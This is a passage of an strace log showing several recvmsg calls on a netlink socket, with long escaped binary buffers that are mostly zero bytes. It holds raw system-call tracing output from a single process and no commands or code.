\20\376\267\0\376\0\0\0\0\0\0\360J\374\267}\246\4\0\244\201\0\0\1\0\0\0\0\0\0\0\0\0\0\0R\203\346\267\364\17\376\267X\305\271\277\0\0\0\0\240\277\271\277G\34\375\267\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0+F\321\267\0\0\0\0\1\0\0\0\0\0\0\0\340n\321\267\200\300\271\277\0066\375\267X\305\271\277\0\0\0\0\v\273\374\267\364\17\376\267{\305\271\277t\305\271\277p\305\271\277\300\25\376\267hu\351\267PH\374\267\0\0\0\0\0\0\0\0\364\17\376\267\360\33\375\267\340n\321\267\200\300\271\277\250\277\271\277\3515\375\267\0\0\0\0\364\17\376\267X\305\271\277\0\0\0\0,\300\271\277G\34\375\267\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0r\241\322\267\0\0\0\0\1\0\0\0\0\0\0\0\244-\346\267\f\301\271\277\0066\375\267X\305\271\277\0\0\0\0\1\1\1\0\0\0\0\0\301\240\375\267t\305\271\277p\305\271\277\300\25\376\2674\0\0\0L!\0\0\0\0\0\0\364\17\376\267\0\0\0\0\2\0\0\0\200\300\271\277\365\241\375\267\10\0\0\0\344x\351\267\340r\351\267\210\305\271\277y&\375\267\350x\351\267\344x\351\267\4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\340r\351\267\240\22\376\267\0\0\0\0\0\0\0\0\34\20\347\267\224\301\271\277\0066\375\267X\305\271\277\0\0\0\0\5\0\0\0\0\20\0\0{\305\271\277\301\240\375\267p\305\271\277\300\25\376\267\230\1\0\0\310\1\0\0\0\0\0\0\0\20\0\0\364\17\376\267\2\0\0\0l.\346\267\f\301\271\277\365\241\375\267\10\0\0\0\244x\351\267\230x\351\267\210\305\271\277\346\36\375\267\244x\351\267\230x\351\267\10\0\0\0\235N\347\267\0\0\0\0\1\0\0\0\0\0\0\0\240\22\376\267\0\0\0\0\0066\375\267X\305\271\277\0\0\0\0\6\0\0\0\4\0\0\0{\305\271\277t\305\271\277p\305\271\277\301\240\375\267@\1\0\0@\1\0\0\0\0\0\0\1\0\0\0\364\17\376\267\360\33\375\267\364\17\376\267\2\0\0\0\324\20\347\267\224\301\271\277\365\241\375\267\10\0\0\0\214x\351\267\200x\351\267\210\305\271\277\346\36\375\267\214x\351\267\200x\351\267\10\0\0\0\324\301\271\277G\34\375\267\340r\351\267\0\0\0\0\0\0\0\0\0\0\0\0<\17\355\267\0\0\0\0\1\0\0\0\0\0\0\0\340\301\271\277\0\0\0\0\364/\346\267\246\340\331\267\234\302\271\277\317\20\341\267\0\0\0\0\313\354\374\267", 4096}], msg_controllen=0, msg_flags=0}, 0) = 108
+29844 15:04:56.628656 recvmsg(7, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000}, msg_iov(1)=[{"@\0\0\0\24\0\2\0X\331%Y\224t\0\0\n\200\200\376\1\0\0\0\24\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\24\0\6\0\377\377\377\377\377\377\377\377V\2\0\0V\2\0\0@\0\0\0\24\0\2\0X\331%Y\224t\0\0\n@\200\375\2\0\0\0\24\0\1\0\376\200\0\0\0\0\0\0\n\0\'\377\376F\331J\24\0\6\0\377\377\377\377\377\377\377\377V\2\0\0V\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\306e\374\267\264\25\376\267+F\321\267\344\274\271\277\211B\375\267+F\321\267\270e\374\267\364\17\376\267\240\22\376\267\0\0\0\0t\277\271\277\220\331\374\267!F\321\267R\203\346\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0+F\321\267\0\0\0\0 \20\376\267\0\0\0\0\0\0\0\0\210u\351\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0R\203\346\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\306e\374\267\264\25\376\267r\241\322\267p\275\271\277\211B\375\267r\241\322\267\270e\374\267\364\17\376\267\240\22\376\267\0\0\0\0\0\300\271\277\220\331\374\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0r\241\322\267\0\0\0\0 \20\376\267\0\0\0\0\0\0\0\0\340r\351\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\276\271\277\30\276\271\277|p\321\267\300\277\271\277\235\310\374\267Lp\321\267Fu\351\2670u\351\267H\203\346\267\370\275\271\277\211B\375\267H\203\346\267<u\351\267\364\17\376\267\340r\351\267\270}\346\267\210\300\271\277\220\331\374\267H\203\346\267R\203\346\267\374\34\0\0\374\34\0\0\0\0\0\0\5\0\0\0H\203\346\267\0@\0\0 \20\376\267|0\0\0\0\0\0\0008p\351\267\210u\351\267H\276\271\277\365\241\375\267\10\0\0\0hu\351\267R\203\346\267\224\276\271\277\237\1\375\267Fu\351\2670u\351\267\235N\347\267x\276\271\277\211B\375\267\235N\347\267<u\351\267\364\17\376\267\340r\351\267\270}\346\267\10\301\271\277\220\331\374\267\235N\347\267R\203\346\267\364\17\376\2670\276\271\277\210u\351\267\300\277\271\277\235N\347\267\7\0\0\0 \20\376\267\0\0\0\0\0\0\0\0\230M\374\267\0\0\0\0\310\276\271\277\365\241\375\267\10\0\0\0\364\17\376\267R\203\346\267\340r\351\267\340\276\271\277\365\241\375\267`h\374\267\10\0\0\0 \20\376\267\0\276\271\2774\300\271\277\7\0\0\0\351\3\371\267\306e\374\267\264\25\376\267<\17\355\267\30\277\271\277\211B\375\267<\17\355\267\270e\374\267\364\17\376\267\240\22\376\267\0\0\0\0\250\301\271\277\220\331\374\267\26\17\355\267R\203\346\267\2\0\0\0X\300\271\0Lp\321\267|p\321\267<\17\355\267|0\0\0 \20\376\267\0\376\0\0\0\0\0\0\360J\374\267}\246\4\0\244\201\0\0\1\0\0\0\0\0\0\0\0\0\0\0R\203\346\267\364\17\376\267X\305\271\277\0\0\0\0\240\277\271\277G\34\375\267\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0+F\321\267\0\0\0\0\1\0\0\0\0\0\0\0\340n\321\267\200\300\271\277\0066\375\267X\305\271\277\0\0\0\0\v\273\374\267\364\17\376\267{\305\271\277t\305\271\277p\305\271\277\300\25\376\267hu\351\267PH\374\267\0\0\0\0\0\0\0\0\364\17\376\267\360\33\375\267\340n\321\267\200\300\271\277\250\277\271\277\3515\375\267\0\0\0\0\364\17\376\267X\305\271\277\0\0\0\0,\300\271\277G\34\375\267\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0r\241\322\267\0\0\0\0\1\0\0\0\0\0\0\0\244-\346\267\f\301\271\277\0066\375\267X\305\271\277\0\0\0\0\1\1\1\0\0\0\0\0\301\240\375\267t\305\271\277p\305\271\277\300\25\376\2674\0\0\0L!\0\0\0\0\0\0\364\17\376\267\0\0\0\0\2\0\0\0\200\300\271\277\365\241\375\267\10\0\0\0\344x\351\267\340r\351\267\210\305\271\277y&\375\267\350x\351\267\344x\351\267\4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\340r\351\267\240\22\376\267\0\0\0\0\0\0\0\0\34\20\347\267\224\301\271\277\0066\375\267X\305\271\277\0\0\0\0\5\0\0\0\0\20\0\0{\305\271\277\301\240\375\267p\305\271\277\300\25\376\267\230\1\0\0\310\1\0\0\0\0\0\0\0\20\0\0\364\17\376\267\2\0\0\0l.\346\267\f\301\271\277\365\241\375\267\10\0\0\0\244x\351\267\230x\351\267\210\305\271\277\346\36\375\267\244x\351\267\230x\351\267\10\0\0\0\235N\347\267\0\0\0\0\1\0\0\0\0\0\0\0\240\22\376\267\0\0\0\0\0066\375\267X\305\271\277\0\0\0\0\6\0\0\0\4\0\0\0{\305\271\277t\305\271\277p\305\271\277\301\240\375\267@\1\0\0@\1\0\0\0\0\0\0\1\0\0\0\364\17\376\267\360\33\375\267\364\17\376\267\2\0\0\0\324\20\347\267\224\301\271\277\365\241\375\267\10\0\0\0\214x\351\267\200x\351\267\210\305\271\277\346\36\375\267\214x\351\267\200x\351\267\10\0\0\0\324\301\271\277G\34\375\267\340r\351\267\0\0\0\0\0\0\0\0\0\0\0\0<\17\355\267\0\0\0\0\1\0\0\0\0\0\0\0\340\301\271\277\0\0\0\0\364/\346\267\246\340\331\267\234\302\271\277\317\20\341\267\0\0\0\0\313\354\374\267", 4096}], msg_controllen=0, msg_flags=0}, 0) = 128
+29844 15:04:56.629378 recvmsg(7, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000}, msg_iov(1)=[{"\24\0\0\0\3\0\2\0X\331%Y\224t\0\0\0\0\0\0\1\0\0\0\24\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\24\0\6\0\377\377\377\377\377\377\377\377V\2\0\0V\2\0\0@\0\0\0\24\0\2\0X\331%Y\224t\0\0\n@\200\375\2\0\0\0\24\0\1\0\376\200\0\0\0\0\0\0\n\0\'\377\376F\331J\24\0\6\0\377\377\377\377\377\377\377\377V\2\0\0V\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\